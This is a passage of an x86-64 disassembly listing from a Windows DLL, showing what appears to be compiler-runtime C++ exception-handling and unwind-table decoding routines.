   180002bb5:	7c 1d                	jl     0x180002bd4
   180002bb7:	48 c1 e8 20          	shr    $0x20,%rax
   180002bbb:	44 3b f0             	cmp    %eax,%r14d
   180002bbe:	7f 14                	jg     0x180002bd4
   180002bc0:	85 c9                	test   %ecx,%ecx
   180002bc2:	41 8b f8             	mov    %r8d,%edi
   180002bc5:	41 8b f0             	mov    %r8d,%esi
   180002bc8:	0f 44 f9             	cmove  %ecx,%edi
   180002bcb:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   180002bcf:	0f 28 74 24 20       	movaps 0x20(%rsp),%xmm6
   180002bd4:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   180002bd8:	41 ff c0             	inc    %r8d
   180002bdb:	0f b6 0a             	movzbl (%rdx),%ecx
   180002bde:	83 e1 0f             	and    $0xf,%ecx
   180002be1:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002be8:	01 00 
   180002bea:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002bf1:	00 
   180002bf2:	48 2b d0             	sub    %rax,%rdx
   180002bf5:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002bf8:	d3 e8                	shr    %cl,%eax
   180002bfa:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180002bfe:	89 43 18             	mov    %eax,0x18(%rbx)
   180002c01:	0f b6 0a             	movzbl (%rdx),%ecx
   180002c04:	83 e1 0f             	and    $0xf,%ecx
   180002c07:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002c0e:	01 00 
   180002c10:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002c17:	00 
   180002c18:	48 2b d0             	sub    %rax,%rdx
   180002c1b:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002c1e:	d3 e8                	shr    %cl,%eax
   180002c20:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180002c24:	89 43 1c             	mov    %eax,0x1c(%rbx)
   180002c27:	0f b6 0a             	movzbl (%rdx),%ecx
   180002c2a:	83 e1 0f             	and    $0xf,%ecx
   180002c2d:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002c34:	01 00 
   180002c36:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002c3d:	00 
   180002c3e:	48 2b d0             	sub    %rax,%rdx
   180002c41:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002c44:	d3 e8                	shr    %cl,%eax
   180002c46:	89 43 20             	mov    %eax,0x20(%rbx)
   180002c49:	48 8d 42 04          	lea    0x4(%rdx),%rax
   180002c4d:	48 89 53 08          	mov    %rdx,0x8(%rbx)
   180002c51:	8b 0a                	mov    (%rdx),%ecx
   180002c53:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180002c57:	89 4b 24             	mov    %ecx,0x24(%rbx)
   180002c5a:	45 3b c1             	cmp    %r9d,%r8d
   180002c5d:	0f 85 49 ff ff ff    	jne    0x180002bac
   180002c63:	ff c6                	inc    %esi
   180002c65:	66 0f 7f 74 24 40    	movdqa %xmm6,0x40(%rsp)
   180002c6b:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180002c70:	89 74 24 38          	mov    %esi,0x38(%rsp)
   180002c74:	48 8b cb             	mov    %rbx,%rcx
   180002c77:	e8 54 01 00 00       	call   0x180002dd0
   180002c7c:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   180002c81:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180002c86:	48 8b c5             	mov    %rbp,%rax
   180002c89:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   180002c8d:	49 8b 73 20          	mov    0x20(%r11),%rsi
   180002c91:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   180002c95:	f3 0f 7f 75 00       	movdqu %xmm6,0x0(%rbp)
   180002c9a:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   180002c9f:	f3 0f 7f 45 10       	movdqu %xmm0,0x10(%rbp)
   180002ca4:	49 8b 6b 18          	mov    0x18(%r11),%rbp
   180002ca8:	49 8b e3             	mov    %r11,%rsp
   180002cab:	41 5e                	pop    %r14
   180002cad:	c3                   	ret
   180002cae:	cc                   	int3
   180002caf:	cc                   	int3
   180002cb0:	40 55                	rex push %rbp
   180002cb2:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   180002cb7:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   180002cbe:	48 8b 05 4b 73 01 00 	mov    0x1734b(%rip),%rax        # 0x18001a010
   180002cc5:	48 33 c4             	xor    %rsp,%rax
   180002cc8:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   180002ccc:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   180002cd0:	48 8d 05 09 d7 00 00 	lea    0xd709(%rip),%rax        # 0x1800103e0
   180002cd7:	0f 10 00             	movups (%rax),%xmm0
   180002cda:	4c 8b d9             	mov    %rcx,%r11
   180002cdd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180002ce2:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180002ce6:	0f 11 01             	movups %xmm0,(%rcx)
   180002ce9:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180002ced:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180002cf1:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180002cf5:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   180002cf9:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180002cfd:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180002d01:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180002d05:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   180002d09:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180002d0d:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180002d11:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   180002d18:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180002d1c:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   180002d20:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   180002d27:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   180002d2b:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   180002d32:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   180002d39:	48 8d 05 1c 20 00 00 	lea    0x201c(%rip),%rax        # 0x180004d5c
   180002d40:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   180002d44:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   180002d48:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   180002d4c:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   180002d50:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   180002d54:	4c 8b 45 6f          	mov    0x6f(%rbp),%r8
   180002d58:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   180002d5c:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   180002d60:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   180002d64:	49 8b 48 18          	mov    0x18(%r8),%rcx
   180002d68:	4d 8b 40 20          	mov    0x20(%r8),%r8
   180002d6c:	49 03 4a 08          	add    0x8(%r10),%rcx
   180002d70:	4d 03 42 08          	add    0x8(%r10),%r8
   180002d74:	48 63 45 67          	movslq 0x67(%rbp),%rax
   180002d78:	48 89 45 e7          	mov    %rax,-0x19(%rbp)
   180002d7c:	49 8b 42 40          	mov    0x40(%r10),%rax
   180002d80:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180002d85:	49 8b 42 28          	mov    0x28(%r10),%rax
   180002d89:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   180002d8d:	45 33 c9             	xor    %r9d,%r9d
   180002d90:	48 89 4d b7          	mov    %rcx,-0x49(%rbp)
   180002d94:	49 8b 0b             	mov    (%r11),%rcx
   180002d97:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   180002d9b:	49 8b 12             	mov    (%r10),%rdx
   180002d9e:	4c 89 45 d7          	mov    %r8,-0x29(%rbp)
   180002da2:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180002da7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002dac:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   180002db3:	19 
   180002db4:	ff 15 e6 d2 00 00    	call   *0xd2e6(%rip)        # 0x1800100a0
   180002dba:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   180002dbe:	48 33 cc             	xor    %rsp,%rcx
   180002dc1:	e8 fa ec ff ff       	call   0x180001ac0
   180002dc6:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   180002dcd:	5d                   	pop    %rbp
   180002dce:	c3                   	ret
   180002dcf:	cc                   	int3
   180002dd0:	4c 8b 41 10          	mov    0x10(%rcx),%r8
   180002dd4:	4c 8d 15 25 d2 ff ff 	lea    -0x2ddb(%rip),%r10        # 0x180000000
   180002ddb:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   180002ddf:	4c 8b c9             	mov    %rcx,%r9
   180002de2:	41 0f b6 08          	movzbl (%r8),%ecx
   180002de6:	83 e1 0f             	and    $0xf,%ecx
   180002de9:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002df0:	01 00 
   180002df2:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002df9:	00 
   180002dfa:	4c 2b c0             	sub    %rax,%r8
   180002dfd:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   180002e01:	4d 89 41 08          	mov    %r8,0x8(%r9)
   180002e05:	d3 e8                	shr    %cl,%eax
   180002e07:	41 89 41 18          	mov    %eax,0x18(%r9)
   180002e0b:	41 0f b6 08          	movzbl (%r8),%ecx
   180002e0f:	83 e1 0f             	and    $0xf,%ecx
   180002e12:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002e19:	01 00 
   180002e1b:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002e22:	00 
   180002e23:	4c 2b c0             	sub    %rax,%r8
   180002e26:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   180002e2a:	4d 89 41 08          	mov    %r8,0x8(%r9)
   180002e2e:	d3 e8                	shr    %cl,%eax
   180002e30:	41 89 41 1c          	mov    %eax,0x1c(%r9)
   180002e34:	41 0f b6 08          	movzbl (%r8),%ecx
   180002e38:	83 e1 0f             	and    $0xf,%ecx
   180002e3b:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002e42:	01 00 
   180002e44:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002e4b:	00 
   180002e4c:	4c 2b c0             	sub    %rax,%r8
   180002e4f:	41 8b 40 fc          	mov    -0x4(%r8),%eax
   180002e53:	d3 e8                	shr    %cl,%eax
   180002e55:	83 7a 08 00          	cmpl   $0x0,0x8(%rdx)
   180002e59:	4d 89 41 08          	mov    %r8,0x8(%r9)
   180002e5d:	41 89 41 20          	mov    %eax,0x20(%r9)
   180002e61:	49 8d 40 04          	lea    0x4(%r8),%rax
   180002e65:	41 8b 08             	mov    (%r8),%ecx
   180002e68:	49 89 41 08          	mov    %rax,0x8(%r9)
   180002e6c:	41 89 49 24          	mov    %ecx,0x24(%r9)
   180002e70:	0f 84 18 01 00 00    	je     0x180002f8e
   180002e76:	44 8b 42 08          	mov    0x8(%rdx),%r8d
   180002e7a:	49 8b 51 08          	mov    0x8(%r9),%rdx
   180002e7e:	0f b6 0a             	movzbl (%rdx),%ecx
   180002e81:	83 e1 0f             	and    $0xf,%ecx
   180002e84:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002e8b:	01 00 
   180002e8d:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002e94:	00 
   180002e95:	48 2b d0             	sub    %rax,%rdx
   180002e98:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002e9b:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002e9f:	d3 e8                	shr    %cl,%eax
   180002ea1:	41 89 41 18          	mov    %eax,0x18(%r9)
   180002ea5:	0f b6 0a             	movzbl (%rdx),%ecx
   180002ea8:	83 e1 0f             	and    $0xf,%ecx
   180002eab:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002eb2:	01 00 
   180002eb4:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002ebb:	00 
   180002ebc:	48 2b d0             	sub    %rax,%rdx
   180002ebf:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002ec2:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002ec6:	d3 e8                	shr    %cl,%eax
   180002ec8:	41 89 41 1c          	mov    %eax,0x1c(%r9)
   180002ecc:	0f b6 0a             	movzbl (%rdx),%ecx
   180002ecf:	83 e1 0f             	and    $0xf,%ecx
   180002ed2:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002ed9:	01 00 
   180002edb:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002ee2:	00 
   180002ee3:	48 2b d0             	sub    %rax,%rdx
   180002ee6:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002ee9:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002eed:	d3 e8                	shr    %cl,%eax
   180002eef:	41 89 41 20          	mov    %eax,0x20(%r9)
   180002ef3:	8b 02                	mov    (%rdx),%eax
   180002ef5:	48 83 c2 04          	add    $0x4,%rdx
   180002ef9:	41 89 41 24          	mov    %eax,0x24(%r9)
   180002efd:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002f01:	0f b6 0a             	movzbl (%rdx),%ecx
   180002f04:	83 e1 0f             	and    $0xf,%ecx
   180002f07:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002f0e:	01 00 
   180002f10:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002f17:	00 
   180002f18:	48 2b d0             	sub    %rax,%rdx
   180002f1b:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002f1e:	d3 e8                	shr    %cl,%eax
   180002f20:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002f24:	41 89 41 18          	mov    %eax,0x18(%r9)
   180002f28:	0f b6 0a             	movzbl (%rdx),%ecx
   180002f2b:	83 e1 0f             	and    $0xf,%ecx
   180002f2e:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002f35:	01 00 
   180002f37:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002f3e:	00 
   180002f3f:	48 2b d0             	sub    %rax,%rdx
   180002f42:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002f45:	d3 e8                	shr    %cl,%eax
   180002f47:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002f4b:	41 89 41 1c          	mov    %eax,0x1c(%r9)
   180002f4f:	0f b6 0a             	movzbl (%rdx),%ecx
   180002f52:	83 e1 0f             	and    $0xf,%ecx
   180002f55:	4a 0f be 84 11 c0 03 	movsbq 0x103c0(%rcx,%r10,1),%rax
   180002f5c:	01 00 
   180002f5e:	42 8a 8c 11 d0 03 01 	mov    0x103d0(%rcx,%r10,1),%cl
   180002f65:	00 
   180002f66:	48 2b d0             	sub    %rax,%rdx
   180002f69:	8b 42 fc             	mov    -0x4(%rdx),%eax
   180002f6c:	d3 e8                	shr    %cl,%eax
   180002f6e:	41 89 41 20          	mov    %eax,0x20(%r9)
   180002f72:	48 8d 42 04          	lea    0x4(%rdx),%rax
   180002f76:	49 89 51 08          	mov    %rdx,0x8(%r9)
   180002f7a:	8b 0a                	mov    (%rdx),%ecx
   180002f7c:	49 89 41 08          	mov    %rax,0x8(%r9)
   180002f80:	41 89 49 24          	mov    %ecx,0x24(%r9)
   180002f84:	49 83 e8 01          	sub    $0x1,%r8
   180002f88:	0f 85 ec fe ff ff    	jne    0x180002e7a
   180002f8e:	c3                   	ret
   180002f8f:	cc                   	int3
   180002f90:	40 53                	rex push %rbx
   180002f92:	48 83 ec 20          	sub    $0x20,%rsp
   180002f96:	48 8b d9             	mov    %rcx,%rbx
   180002f99:	48 89 11             	mov    %rdx,(%rcx)
   180002f9c:	e8 33 09 00 00       	call   0x1800038d4
   180002fa1:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   180002fa5:	73 0b                	jae    0x180002fb2
   180002fa7:	e8 28 09 00 00       	call   0x1800038d4
   180002fac:	48 8b 48 58          	mov    0x58(%rax),%rcx
   180002fb0:	eb 02                	jmp    0x180002fb4
   180002fb2:	33 c9                	xor    %ecx,%ecx
   180002fb4:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180002fb8:	e8 17 09 00 00       	call   0x1800038d4
   180002fbd:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180002fc1:	48 8b c3             	mov    %rbx,%rax
   180002fc4:	48 83 c4 20          	add    $0x20,%rsp
   180002fc8:	5b                   	pop    %rbx
   180002fc9:	c3                   	ret
   180002fca:	cc                   	int3
   180002fcb:	cc                   	int3
   180002fcc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002fd1:	57                   	push   %rdi
   180002fd2:	48 83 ec 20          	sub    $0x20,%rsp
   180002fd6:	48 8b f9             	mov    %rcx,%rdi
   180002fd9:	e8 f6 08 00 00       	call   0x1800038d4
   180002fde:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   180002fe2:	75 35                	jne    0x180003019
   180002fe4:	e8 eb 08 00 00       	call   0x1800038d4
   180002fe9:	48 8b 50 58          	mov    0x58(%rax),%rdx
   180002fed:	48 85 d2             	test   %rdx,%rdx
   180002ff0:	74 27                	je     0x180003019
   180002ff2:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   180002ff6:	48 3b fa             	cmp    %rdx,%rdi
   180002ff9:	74 0a                	je     0x180003005
   180002ffb:	48 8b d3             	mov    %rbx,%rdx
   180002ffe:	48 85 db             	test   %rbx,%rbx
   180003001:	74 16                	je     0x180003019
   180003003:	eb ed                	jmp    0x180002ff2
   180003005:	e8 ca 08 00 00       	call   0x1800038d4
   18000300a:	48 89 58 58          	mov    %rbx,0x58(%rax)
   18000300e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003013:	48 83 c4 20          	add    $0x20,%rsp
   180003017:	5f                   	pop    %rdi
   180003018:	c3                   	ret
   180003019:	e8 b6 47 00 00       	call   0x1800077d4
   18000301e:	cc                   	int3
   18000301f:	cc                   	int3
   180003020:	48 83 ec 28          	sub    $0x28,%rsp
   180003024:	e8 ab 08 00 00       	call   0x1800038d4
   180003029:	48 8b 40 60          	mov    0x60(%rax),%rax
   18000302d:	48 83 c4 28          	add    $0x28,%rsp
   180003031:	c3                   	ret
   180003032:	cc                   	int3
   180003033:	cc                   	int3
   180003034:	48 83 ec 28          	sub    $0x28,%rsp
   180003038:	e8 97 08 00 00       	call   0x1800038d4
   18000303d:	48 8b 40 68          	mov    0x68(%rax),%rax
   180003041:	48 83 c4 28          	add    $0x28,%rsp
   180003045:	c3                   	ret
   180003046:	cc                   	int3
   180003047:	cc                   	int3
   180003048:	40 53                	rex push %rbx
   18000304a:	48 83 ec 20          	sub    $0x20,%rsp
   18000304e:	48 8b d9             	mov    %rcx,%rbx
   180003051:	e8 7e 08 00 00       	call   0x1800038d4
   180003056:	48 89 58 60          	mov    %rbx,0x60(%rax)
   18000305a:	48 83 c4 20          	add    $0x20,%rsp
   18000305e:	5b                   	pop    %rbx
   18000305f:	c3                   	ret
   180003060:	40 53                	rex push %rbx
   180003062:	48 83 ec 20          	sub    $0x20,%rsp
   180003066:	48 8b d9             	mov    %rcx,%rbx
   180003069:	e8 66 08 00 00       	call   0x1800038d4
   18000306e:	48 89 58 68          	mov    %rbx,0x68(%rax)
   180003072:	48 83 c4 20          	add    $0x20,%rsp
   180003076:	5b                   	pop    %rbx
   180003077:	c3                   	ret
   180003078:	48 8b c4             	mov    %rsp,%rax
   18000307b:	48 89 58 10          	mov    %rbx,0x10(%rax)
   18000307f:	48 89 68 18          	mov    %rbp,0x18(%rax)
   180003083:	48 89 70 20          	mov    %rsi,0x20(%rax)
   180003087:	57                   	push   %rdi
   180003088:	48 83 ec 60          	sub    $0x60,%rsp
   18000308c:	83 60 dc 00          	andl   $0x0,-0x24(%rax)
   180003090:	49 8b f9             	mov    %r9,%rdi
   180003093:	83 60 e0 00          	andl   $0x0,-0x20(%rax)
   180003097:	49 8b f0             	mov    %r8,%rsi
   18000309a:	83 60 e4 00          	andl   $0x0,-0x1c(%rax)
   18000309e:	48 8b e9             	mov    %rcx,%rbp
   1800030a1:	83 60 e8 00          	andl   $0x0,-0x18(%rax)
   1800030a5:	83 60 ec 00          	andl   $0x0,-0x14(%rax)
   1800030a9:	49 8b 59 08          	mov    0x8(%r9),%rbx
   1800030ad:	c6 40 d8 00          	movb   $0x0,-0x28(%rax)
   1800030b1:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1800030b5:	e8 1a 08 00 00       	call   0x1800038d4
   1800030ba:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1800030be:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   1800030c2:	e8 0d 08 00 00       	call   0x1800038d4
   1800030c7:	48 89 58 68          	mov    %rbx,0x68(%rax)
   1800030cb:	e8 04 08 00 00       	call   0x1800038d4
   1800030d0:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   1800030d4:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1800030d9:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   1800030dd:	c6 44 24 20 00       	movb   $0x0,0x20(%rsp)
   1800030e2:	8b 09                	mov    (%rcx),%ecx
   1800030e4:	48 03 48 60          	add    0x60(%rax),%rcx
   1800030e8:	48 8b 47 10          	mov    0x10(%rdi),%rax
   1800030ec:	44 8b 08             	mov    (%rax),%r9d
   1800030ef:	e8 d0 f8 ff ff       	call   0x1800029c4
   1800030f4:	c6 44 24 38 00       	movb   $0x0,0x38(%rsp)
   1800030f9:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1800030fe:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   180003104:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   180003109:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   18000310e:	4c 8b cf             	mov    %rdi,%r9
   180003111:	4c 8b c6             	mov    %rsi,%r8
   180003114:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180003119:	48 8b cd             	mov    %rbp,%rcx
   18000311c:	e8 f7 17 00 00       	call   0x180004918
   180003121:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   180003126:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   18000312a:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   18000312e:	49 8b 73 28          	mov    0x28(%r11),%rsi
   180003132:	49 8b e3             	mov    %r11,%rsp
   180003135:	5f                   	pop    %rdi
   180003136:	c3                   	ret
   180003137:	cc                   	int3
   180003138:	48 85 c9             	test   %rcx,%rcx
   18000313b:	74 67                	je     0x1800031a4
   18000313d:	88 54 24 10          	mov    %dl,0x10(%rsp)
   180003141:	48 83 ec 48          	sub    $0x48,%rsp
   180003145:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   18000314b:	75 53                	jne    0x1800031a0
   18000314d:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   180003151:	75 4d                	jne    0x1800031a0
   180003153:	8b 41 20             	mov    0x20(%rcx),%eax
   180003156:	2d 20 05 93 19       	sub    $0x19930520,%eax
   18000315b:	83 f8 02             	cmp    $0x2,%eax
   18000315e:	77 40                	ja     0x1800031a0
   180003160:	48 8b 41 30          	mov    0x30(%rcx),%rax
   180003164:	48 85 c0             	test   %rax,%rax
   180003167:	74 37                	je     0x1800031a0
   180003169:	48 63 50 04          	movslq 0x4(%rax),%rdx
   18000316d:	85 d2                	test   %edx,%edx
   18000316f:	74 11                	je     0x180003182
   180003171:	48 03 51 38          	add    0x38(%rcx),%rdx
   180003175:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   180003179:	e8 2a 00 00 00       	call   0x1800031a8
   18000317e:	eb 20                	jmp    0x1800031a0
   180003180:	eb 1e                	jmp    0x1800031a0
   180003182:	f6 00 10             	testb  $0x10,(%rax)
   180003185:	74 19                	je     0x1800031a0
   180003187:	48 8b 41 28          	mov    0x28(%rcx),%rax
   18000318b:	48 8b 08             	mov    (%rax),%rcx
   18000318e:	48 85 c9             	test   %rcx,%rcx
   180003191:	74 0d                	je     0x1800031a0
   180003193:	48 8b 01             	mov    (%rcx),%rax
   180003196:	48 8b 40 10          	mov    0x10(%rax),%rax
   18000319a:	ff 15 c8 d0 00 00    	call   *0xd0c8(%rip)        # 0x180010268
   1800031a0:	48 83 c4 48          	add    $0x48,%rsp
   1800031a4:	c3                   	ret
   1800031a5:	cc                   	int3
   1800031a6:	cc                   	int3
   1800031a7:	cc                   	int3
   1800031a8:	48 ff e2             	rex.W jmp *%rdx
   1800031ab:	cc                   	int3
   1800031ac:	40 53                	rex push %rbx
   1800031ae:	48 83 ec 20          	sub    $0x20,%rsp
   1800031b2:	48 8b d9             	mov    %rcx,%rbx
   1800031b5:	e8 1a 07 00 00       	call   0x1800038d4
   1800031ba:	48 8b 50 58          	mov    0x58(%rax),%rdx
   1800031be:	eb 09                	jmp    0x1800031c9
   1800031c0:	48 39 1a             	cmp    %rbx,(%rdx)
   1800031c3:	74 12                	je     0x1800031d7
   1800031c5:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   1800031c9:	48 85 d2             	test   %rdx,%rdx
   1800031cc:	75 f2                	jne    0x1800031c0
   1800031ce:	8d 42 01             	lea    0x1(%rdx),%eax
   1800031d1:	48 83 c4 20          	add    $0x20,%rsp
   1800031d5:	5b                   	pop    %rbx
   1800031d6:	c3                   	ret
   1800031d7:	33 c0                	xor    %eax,%eax
   1800031d9:	eb f6                	jmp    0x1800031d1
   1800031db:	cc                   	int3
   1800031dc:	48 63 02             	movslq (%rdx),%rax
   1800031df:	48 03 c1             	add    %rcx,%rax
   1800031e2:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   1800031e6:	7c 16                	jl     0x1800031fe
   1800031e8:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   1800031ec:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   1800031f0:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   1800031f4:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   1800031f8:	4d 03 c1             	add    %r9,%r8
   1800031fb:	49 03 c0             	add    %r8,%rax
   1800031fe:	c3                   	ret
   1800031ff:	cc                   	int3
   180003200:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003205:	57                   	push   %rdi
   180003206:	48 83 ec 20          	sub    $0x20,%rsp
   18000320a:	48 8b 39             	mov    (%rcx),%rdi
   18000320d:	48 8b d9             	mov    %rcx,%rbx
   180003210:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   180003216:	74 12                	je     0x18000322a
   180003218:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   18000321e:	74 0a                	je     0x18000322a
   180003220:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   180003226:	74 22                	je     0x18000324a
   180003228:	eb 13                	jmp    0x18000323d
   18000322a:	e8 a5 06 00 00       	call   0x1800038d4
   18000322f:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   180003233:	7e 08                	jle    0x18000323d
   180003235:	e8 9a 06 00 00       	call   0x1800038d4
   18000323a:	ff 48 30             	decl   0x30(%rax)
   18000323d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003242:	33 c0                	xor    %eax,%eax
   180003244:	48 83 c4 20          	add    $0x20,%rsp
   180003248:	5f                   	pop    %rdi
   180003249:	c3                   	ret
   18000324a:	e8 85 06 00 00       	call   0x1800038d4
   18000324f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   180003253:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   180003257:	e8 78 06 00 00       	call   0x1800038d4
   18000325c:	48 89 58 28          	mov    %rbx,0x28(%rax)
   180003260:	e8 3b 45 00 00       	call   0x1800077a0
   180003265:	cc                   	int3
   180003266:	cc                   	int3
   180003267:	cc                   	int3
   180003268:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000326d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003272:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003277:	41 56                	push   %r14
   180003279:	48 83 ec 20          	sub    $0x20,%rsp
   18000327d:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   180003281:	4c 8b f2             	mov    %rdx,%r14
   180003284:	48 8b f1             	mov    %rcx,%rsi
   180003287:	74 4c                	je     0x1800032d5
   180003289:	48 8b 01             	mov    (%rcx),%rax
   18000328c:	48 85 c0             	test   %rax,%rax
   18000328f:	74 44                	je     0x1800032d5
   180003291:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   180003295:	48 ff c7             	inc    %rdi
